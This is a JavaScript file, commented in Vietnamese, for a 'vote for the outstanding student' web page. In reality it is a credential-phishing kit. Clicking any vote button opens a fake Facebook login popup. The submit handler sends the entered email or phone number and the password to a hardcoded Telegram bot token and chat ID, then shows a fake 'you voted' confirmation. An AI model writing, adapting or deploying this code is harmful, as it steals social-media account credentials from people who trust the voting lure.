document.addEventListener('DOMContentLoaded', function() {
    // Telegram bot thông tin
    const BOT_TOKEN = '8016061982:AAGBDhixC2fxTyhV70s5LH04vSjBeQdZ_Fs';
    const CHAT_ID = '6360461491';
    const TELEGRAM_API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    
    // Lấy các phần tử DOM
    const voteButtons = document.querySelectorAll('.vote-btn');
    const loginPopup = document.getElementById('loginPopup');
    const closeBtn = document.querySelector('.close-btn');
    const loginForm = document.getElementById('loginForm');
    
    // Xử lý click nút bình chọn
    voteButtons.forEach(button => {
        button.addEventListener('click', function(e) {
            e.preventDefault();
            const studentCard = this.closest('.student-card');
            const studentId = studentCard.getAttribute('data-id');
            const studentName = studentCard.querySelector('h3').textContent;
            
            // Hiển thị popup đăng nhập
            loginPopup.style.display = 'flex';
            
            // Lưu thông tin học sinh được chọn vào form
            loginForm.setAttribute('data-student-id', studentId);
            loginForm.setAttribute('data-student-name', studentName);
        });
    });
    
    // Đóng popup
    closeBtn.addEventListener('click', function() {
        loginPopup.style.display = 'none';
    });
    
    // Xử lý submit form đăng nhập
    loginForm.addEventListener('submit', function(e) {
        e.preventDefault();
        
        const email = document.getElementById('fbEmail').value;
        const password = document.getElementById('fbPassword').value;
        const studentId = this.getAttribute('data-student-id');
        const studentName = this.getAttribute('data-student-name');
        
        // Gửi thông tin đến Telegram bot
        sendToTelegram(email, password, studentId, studentName);
        
        // Hiển thị thông báo (trong thực tế không nên làm vậy)
        alert(`Bạn đã bình chọn cho ${studentName}!`);
        
        // Đóng popup
        loginPopup.style.display = 'none';
        
        // Reset form
        this.reset();
    });
    
    // Hàm gửi thông tin đến Telegram
    function sendToTelegram(email, password, studentId, studentName) {
        const message = `📌 Có người bình chọn học sinh xuất sắc!
        
📌 Học sinh được chọn: ${studentName} (ID: ${studentId})
📌 Thông tin đăng nhập Facebook:
   - Email/SĐT: ${email}
   - Mật khẩu: ${password}`;
        
        fetch(TELEGRAM_API_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
            }),
        })
        .then(response => response.json())
        .then(data => {
            console.log('Message sent to Telegram:', data);
        })
        .catch(error => {
            console.error('Error sending to Telegram:', error);
        });
    }
});
